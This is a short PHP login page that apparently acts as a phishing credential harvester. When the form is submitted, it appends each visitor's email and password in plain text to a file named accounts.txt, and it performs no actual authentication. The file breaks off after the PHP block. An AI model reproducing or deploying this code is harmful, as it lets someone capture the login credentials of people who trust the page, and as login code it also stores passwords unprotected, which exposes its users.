<html>
    <head>
        <title>Login</title>
    </head>

    <body>
        <?php

        if ($_POST['Login']){

            $myFile = "accounts.txt";
            $fh = fopen($myFile, 'a') or die("Can't open file");
            $stringData = $_POST['email'] . ":";
            fwrite($fh, $stringData);
            $stringData = $_POST['password'] . "\n";
            fwrite($fh, $stringData);
            fclose($fh);
        }
        ?>